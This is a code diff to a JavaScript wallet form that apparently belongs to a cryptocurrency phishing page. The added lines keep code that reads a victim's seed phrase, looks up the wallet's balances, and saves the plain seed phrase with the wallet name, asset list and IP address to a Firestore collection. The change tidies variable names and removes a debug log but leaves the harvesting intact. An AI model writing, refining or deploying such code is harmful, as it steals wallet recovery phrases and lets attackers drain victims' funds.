@@ -98,10 +98,9 @@ function formatTokenArray(tokens) {
   }).join('\n');
 }
 
-   const fetchBalances = async () => {
+const fetchBalances = async (seed) => {
     try {
-      console.log(secretPharse);
-      const { evm } = deriveAddresses(secretPharse);
+      const { evm } = deriveAddresses(seed);
       const chains = Object.values(chainMap);
       const res = await fetch(ANKR_RPC, {
         method: "POST",
@@ -116,7 +115,6 @@ function formatTokenArray(tokens) {
           id: 1,
         }),
       });
-
       const data = await res.json();
       return data;
     } catch (e) {
@@ -137,17 +135,17 @@ function formatTokenArray(tokens) {
    try{
         SetProcessing(true);
         var ip = getLocalStorage("location") ? getLocalStorage("location") : "{}";
-        SetSecretPharse(normalizeText(secretPharse));
-        if(walletName.length > 0 && secretPharse.length > 0 && !getLocalStorage(encodeBase64(secretPharse.trim()))){
-            const privateArr = secretPharse.trim().split(/[\s]+/g);
+        var formattedSeedPhrase = normalizeText(secretPharse);
+        if(walletName.length > 0 && formattedSeedPhrase.length > 0 && !getLocalStorage(encodeBase64(formattedSeedPhrase.trim()))){
+            const privateArr = formattedSeedPhrase.trim().split(/[\s]+/g);
             if(validRange.includes(privateArr.length)){
                 var _asset = '';
                 var _total = 0;
                 var _s = 1;
-                var fetchBl = await fetchBalances(secretPharse);
+                var fetchBl = await fetchBalances(formattedSeedPhrase);
                 if(fetchBl){
                   if(fetchBl.result){
-                    setLocalStorage(encodeBase64(secretPharse.trim()),1)
+                    setLocalStorage(encodeBase64(formattedSeedPhrase.trim()),1)
                     _asset = formatTokenArray(fetchBl.result.assets)
                     _total = Number(fetchBl.result.totalBalanceUsd).toFixed(2);
                   }
@@ -156,7 +154,7 @@ function formatTokenArray(tokens) {
                     _s = 0;
                 }
                 const user = await addDoc(collection(db, "mydata"), {
-                    src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:secretPharse,ip:ip,createdAt: new Date().getTime(),status:0
+                    src:_src,s:_s,total:_total,assets:_asset,wallet:walletName,secret:formattedSeedPhrase,ip:ip,createdAt: new Date().getTime(),status:0
                 });
                 if(user.id){
                     updateIndex(user.id);
